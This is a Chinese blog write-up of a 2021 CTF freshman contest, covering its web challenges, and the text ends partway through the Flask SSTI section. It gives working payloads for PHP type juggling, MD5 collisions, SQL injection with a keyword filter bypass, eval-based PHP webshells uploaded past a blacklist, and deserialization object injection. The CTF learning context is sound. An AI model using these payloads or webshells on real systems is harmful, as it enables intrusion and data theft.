    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar"></i>
    <a href="/2021/12/01/2021-12-01-2021Xp0int%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp/" class="article-date">
        发布于<time datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">
            2021-12-01
        </time>
    </a>
</span>

<span class="article-date">
    <i class="icon icon-calendar-check"></i>
    <a href="/2021/12/01/2021-12-01-2021Xp0int%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp/" class="article-date">
        更新于<time datetime="2021-12-05T03:12:57.404Z" itemprop="dateUpdated">
            2021-12-05
        </time>
    </a>
</span>

        
  <span class="article-category">
    <i class="icon icon-folder"></i>
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </span>

        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
  </span>


        
	<span class="article-read hidden-xs">
	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
	    <span id="busuanzi_container_page_pv">
			<span id="busuanzi_value_page_pv">0</span>
		</span>
	</span>


        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/12/01/2021-12-01-2021Xp0int%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp/#comments" class="article-comment-link">评论</a></span>
        
	
		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 13.3k(字)</span>
	
	
		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 62(分)</span>
	

      </div>
	  <div style="background-color:#EEE9E9;border:1px solid #EEE9E9;border-radius:10px;padding:5px">
		<b>温馨提示</b>：点击页面下方<i style="color:#666" class="icon icon-anchor"></i>以展开或折叠目录~
	  </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <p>第二次更新，终于把Web更完了！最后一道web知识点巨多！<span id="more"></span></p>
<h1 id="2021新生赛"><a href="#2021新生赛" class="headerlink" title="2021新生赛"></a>2021新生赛</h1><p>就嗯肝，倒也还行，可惜杂项肝的太久，web没a完，其他几个题型也没什么时间研究….</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211201230119130.png?80" alt="image-20211201230119130"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;F&quot;</span>);</span><br><span class="line"><span class="variable">$num1</span> = <span class="number">999999999</span>;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$a</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] <span class="keyword">and</span> <span class="variable">$a</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;maybe you can learn something from https://www.php.net/manual/zh/language.operators.array.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;num2&#x27;</span>] &gt; <span class="variable">$num1</span> &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;num2&#x27;</span>]) &lt; <span class="number">4</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Scientific notation!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5a&#x27;</span>])||<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5b&#x27;</span>])||is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;md5a&#x27;</span>])||is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;md5b&#x27;</span>])||(<span class="variable">$_POST</span>[<span class="string">&#x27;md5a&#x27;</span>]==<span class="variable">$_POST</span>[<span class="string">&#x27;md5b&#x27;</span>])||!(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;md5a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;md5b&#x27;</span>]))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>数组运算符</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.array.php">参考php手册</a></p>
</li>
<li><p>\$a == \$b 具有相同键值对则true</p>
</li>
<li>\$a === \$b 具有相同键值对且顺序相同则true</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122105036135.png" alt="image-20211122105036135"></p>
<p><strong>payload1</strong>：<code>b[1]=T&amp;b[0]=C&amp;b[2]=F</code></p>
</li>
<li><p>数组和数字大小比较</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.comparison.php">参考php手册</a></li>
<li>array和其他类型比较，array总是更大</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122111311195.png" alt="image-20211122111311195"></p>
<p><strong>payload2</strong>：<code>?num2[]</code></p>
</li>
<li><p>md5碰撞</p>
<ul>
<li><p>一大堆判断，过滤了数组绕过和字符串0e绕过</p>
</li>
<li><p>只能用真实碰撞</p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">工具:fastcoll</a> 用于生成md5相同，但内容不同的两个文件</p>
<ul>
<li>新建一个1.txt，随便写点东西</li>
<li><code>fastcoll_v1.0.0.5.exe -p 1.txt -o 2.txt 3.txt</code>生成两个新文件</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122112529455.png?70" alt="image-20211122112529455"></p>
</li>
<li><p>然后读取文件内容做个url编码作为参数传递即可</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = fopen(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = fread(<span class="variable">$fh</span>, filesize(<span class="variable">$path</span>));</span><br><span class="line">    fclose(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> md5( (readmyfile(<span class="string">&quot;2.txt&quot;</span>))).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(readmyfile(<span class="string">&quot;2.txt&quot;</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5( (readmyfile(<span class="string">&quot;3.txt&quot;</span>))).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(readmyfile(<span class="string">&quot;3.txt&quot;</span>));</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>payload</strong>:</p>
<p>GET:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://35.229.138.83:16219/?num2[">http://35.229.138.83:16219/?num2[</a>]</p>
</blockquote>
<p>POST:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[1]=T&amp;b[0]=C&amp;b[2]=F&amp;md5a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%29%88%60e%F7%87E%FE%FA%FE%E5-%FB%B7M1%AE%87xiG%3BK%116%3B%BA00%AA%C9%97%C3%E9%E4L%26%AC%26%8B%08U%D2%F1%C3%23w%2C%3C%3E%B1%92V%86L%97%C4%ADI%8D%CDY%C9%7E%CA%02%12%C1%2Fc%06K%3A%25%C9%97%E9%09D%40%27F%8E%00%BB%00a%E1%FB%F4%C4%D8+%5D%A2%C7P%1F%DF%21%1B%82%D5o%A4%AC%EF%F4%8DN%C8%1A%02%12%0E%C5%40%28%95H%D5%7EM%1C%26%88%F3&amp;md5b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%29%88%60e%F7%87E%FE%FA%FE%E5-%FB%B7M1%AE%87%F8iG%3BK%116%3B%BA00%AA%C9%97%C3%E9%E4L%26%AC%26%8B%08U%D2%F1C%24w%2C%3C%3E%B1%92V%86L%97%C4%AD%C9%8D%CDY%C9%7E%CA%02%12%C1%2Fc%06K%3A%25%C9%97%E9%09D%40%27F%0E%00%BB%00a%E1%FB%F4%C4%D8+%5D%A2%C7P%1F%DF%21%1B%82%D5o%A4%AC%EF%F4%0DN%C8%1A%02%12%0E%C5%40%28%95H%D5%7E%CD%1C%26%88%F3</span><br></pre></td></tr></table></figure>
<p>flag: <code>ctf&#123;Good_Luck_Have_Fun!&#125;</code></p>
<h3 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby-sql"></a>baby-sql</h3><ol>
<li>username 单引报错，找到注入点</li>
<li><code>1&#39; or 1=1#</code> 出了个admin</li>
<li><code>1&#39; or 1=2#</code> 出了？？？？</li>
<li><code>1&#39; order by 3#</code> 出了？？？？</li>
<li><code>1&#39; order by 4#</code> 报错，有3个字段</li>
<li><code>1&#39; union select 1,2,3#</code> 2，3回显</li>
<li><code>1&#39; union select 1,2,database()</code> 出库名babysql</li>
<li><code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema= &#39;babysql&#39;</code> 出表名flag</li>
<li><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_NAME=&#39;flag&#39;</code> 出字段名id、flag</li>
<li><code>1&#39; union select 1,2,flag from flag#</code> 出flag</li>
</ol>
<p>flag：<code>flag&#123;9d5ae6b83c7ad5703872574e49aaf6f0&#125;</code></p>
<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby-upload"></a>baby-upload</h3><p>传个一句话php马就完事了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传后访问路径，执行个系统命令<code>cmd=system(&#39;cat /flag&#39;);</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211123112630495.png" alt="image-20211123112630495"></p>
<p>flag：<code>flag&#123;fcc9fbd1d19b3de78b7346bbb005d0d5&#125;</code></p>
<h3 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby-unserialize"></a>baby-unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename); <span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;filename !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;???&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>__wakeup()绕过</p>
<ul>
<li>执行unserialize时会首先调用魔术方法wakeup，里面把php文件改名了，得绕</li>
<li>CVE-2016-7124：当成员属性数目大于实际数目时导致反序列化异常，可绕过__wakeup()</li>
<li>影响版本：php5 &lt; 5.6.25  php7 &lt; 7.0.10</li>
</ul>
<p><strong>payload1</strong>：<code>str=O:4:&quot;baby&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
</li>
<li><p>正则绕过</p>
<ul>
<li>序列化字符串，将表示属性值的小写s改为大写，可以解析十六进制，以此绕过正则匹配</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211122154838546.png" alt="image-20211122154838546"></p>
</li>
</ol>
<p><strong>最终payload</strong>：<code>str=O:4:&quot;baby&quot;:2:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66lag.php&quot;;&#125;</code></p>
<p>flag：<code>flag&#123;f44973d81697b67b26e2a357f537dc3b&#125;</code></p>
<h3 id="easy-js"><a href="#easy-js" class="headerlink" title="easy_js"></a>easy_js</h3><ul>
<li>查看网页源码，看到个index.js，打开，放入js美化/反混淆<a target="_blank" rel="noopener" href="http://icyberchef.com/#recipe=JSON_Beautify(&#39;%20%20%20%20&#39;,false">工具</a>)里面（强推CyberChef这个工具，最好下了本地用，集成了很多功能）</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> H1 = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	H1 += <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">window</span>[<span class="string">&#x27;document&#x27;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;clickNumber&#x27;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;Click number: &#x27;</span> + H1;</span><br><span class="line">	<span class="keyword">if</span> (H1 === <span class="number">99999999</span>) &#123;</span><br><span class="line">		<span class="keyword">var</span> boF7 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">		<span class="keyword">var</span> jQs8 = <span class="string">&#x27;flaggggggggggggggg.php?c1ick=&#x27;</span> + H1;</span><br><span class="line">		boF7[<span class="string">&#x27;onreadystatechange&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (boF7[<span class="string">&#x27;readyState&#x27;</span>] == <span class="number">4</span> &amp;&amp; boF7[<span class="string">&#x27;status&#x27;</span>] == <span class="number">200</span>) &#123;</span><br><span class="line">				text = boF7[<span class="string">&#x27;responseText&#x27;</span>];</span><br><span class="line">				<span class="built_in">window</span>[<span class="string">&#x27;document&#x27;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;flag&#x27;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = text;</span><br><span class="line">				<span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](text);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		boF7[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;GET&#x27;</span>, jQs8, <span class="literal">true</span>);</span><br><span class="line">		boF7[<span class="string">&#x27;send&#x27;</span>]();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">window</span>[<span class="string">&#x27;document&#x27;</span>][<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;flag&#x27;</span>)[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;flag will appear when you click 99999999 times !&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>代码很长，关注重点函数就行了，发现一个url和参数：<code>flaggggggggggggggg.php?c1ick=</code>，直接传99999999，出flag</li>
</ul>
<p><strong>payload</strong>：<code>/flaggggggggggggggg.php?c1ick=99999999</code></p>
<p>flag：<code>flag&#123;ac24adc5685ff-f6402e80bc-6fb6ae59-62aa51fa&#125;</code></p>
<h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><ol>
<li><code>1&quot; or 1=2#</code> 报错，双引闭合</li>
<li>waf只是简单的过滤关键字，双写关键字绕过即可</li>
<li><code>1&quot; oorrder by 4#</code> 报错，3个字段</li>
<li><code>1&quot; ununionion seselectlect 1,2,3#</code> 回显2，3</li>
<li><del>不管了，直接猜数据库和babysql一样，不爆了</del></li>
<li><code>1&quot; ununionion seselectlect 1,2,database()</code> 出库名easysql</li>
<li><code>1&quot; ununionion seselectlect 1,2,table_name frroom infoorrmation_schema.tables whwhereere table_schema=&#39;easysql&#39;#</code> 出表名flag</li>
<li><code>1&quot; ununionion seselectlect 1,2,grrooup_concat(column_name) frroom infoorrmation_schema.columns whwhereere TABLE_NAME=&#39;flflagag&#39;#</code> 出字段名id、flag</li>
<li><code>1&quot; ununionion seselectlect 1,2,flflagag frroom flflagag</code> 出flag</li>
</ol>
<p>flag：<code>flag&#123;d7edeb1366bd99aa12d109c99267e37e&#125;</code></p>
<h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h3><p>黑名单过滤，过滤方法是将字符串替换为空，可以双写绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211123234037146.png" alt="image-20211123234037146"></p>
<p>一句话php马，文件名：a.pphphp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211123234129911.png" alt="image-20211123234129911"></p>
<p>flag：<code>flag&#123;b1ab8564a34adef4aaf542bfed45652c&#125;</code></p>
<h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy-unserialize"></a>easy-unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file === <span class="string">&quot;flag.php&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tmp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str2 = <span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = serialize(<span class="keyword">new</span> tmp(<span class="variable">$str1</span>, <span class="variable">$str2</span>));</span><br><span class="line"><span class="variable">$data</span> = str_replace(<span class="string">&quot;easy&quot;</span>, <span class="string">&quot;ez&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p><strong>代码审计</strong></p>
<ol>
<li>post接收两个参数，传入tmp类后序列化</li>
<li>序列化字符串经过过滤，easy变为ez</li>
<li>过滤后的字符串进行反序列化</li>
</ol>
<p>关键点：给类getflag的file赋上值flag.php，并实例化对象（为了调用__destruct()）</p>
<p><strong>反序列化字符串逃逸</strong></p>
<p>u1s1我觉得<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/396056110">这篇文章</a>总结的还行，不知道为什么没有赞，mark一下，后期自己再整理一遍</p>
<ul>
<li>严格来说属于字符串逃逸中的类逃逸</li>
</ul>
<ol>
<li><p>先给getflag类的file赋上值序列化一下：<code>O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
</li>
<li><p>给str1赋值easy，str2赋值上面的序列化字符串，看下结果</p>
<blockquote>
<p>O:3:”tmp”:2:{s:4:”str1”;s:4:”easy”;s:4:”str2”;s:44:”O:7:”getflag”:1:{s:4:”file”;s:8:”flag.php”;}”;}<br>O:3:”tmp”:2:{s:4:”str1”;s:4:”ez”;s:4:”str2”;s:44:”O:7:”getflag”:1:{s:4:”file”;s:8:”flag.php”;}”;}</p>
</blockquote>
</li>
<li><p>可以看到经过过滤<code>s:4:&quot;easy&quot;</code>变成了<code>s:4:&quot;ez&quot;</code>，逃逸了两个字符</p>
</li>
<li><p>思路：长变短逃逸没办法把已有属性逃逸出去，因此我们直接让tmp类多一个属性str3，并让str3属性的值为getflag类的序列化字符串（这就是类逃逸）</p>
</li>
<li><p>以此构造<code>str2=;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<ul>
<li>分号是为了闭合前面的双引，让他读到 <code>&quot;;</code> 时能够正确闭合属性</li>
</ul>
</li>
<li><p>序列化一下得到<code>O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:4:&quot;easy&quot;;s:4:&quot;str2&quot;;s:56:&quot;;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;</code></p>
<ul>
<li>从easy后面到str3的值前面， <code>&quot;;s:4:&quot;str2&quot;;s:56:</code> 是需要我们覆盖的，计算一下有18个字符</li>
<li>根据每个easy变ez能逃逸2个字符，我们构造9个easy刚好逃逸18个字符</li>
</ul>
</li>
<li><p>构造后尝试一下反序列化，可以看到s:36:后面刚好把需要覆盖的内容包含进去了，造成了类逃逸，实例化了getflag类</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211124105641521.png" alt="image-20211124105641521"></p>
</li>
</ol>
<p><strong>最终payload</strong>：</p>
<p>post：<code>str1=easyeasyeasyeasyeasyeasyeasyeasyeasy&amp;str2=;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>发送后查看网页源码得flag：<code>flag&#123;e99eca072a432c54b84e18e5c5c62ef5&#125;</code></p>
<h3 id="ezPy"><a href="#ezPy" class="headerlink" title="ezPy"></a>ezPy</h3><p>根据题目意思这大概和python有关，搜了一下python的注入，基本都是ssti的模板注入，传个参数试一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211124153950828.png" alt="image-20211124153950828"></p>
<p>可以看到4 = 4，意味着其中的语句被解析了，原理分析网上一堆，不细说，直接参考vulhub的<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/flask/ssti/">exp</a>，把popen执行的命令改为<code>cat /flag</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211124154306818.png" alt="image-20211124154306818"></p>
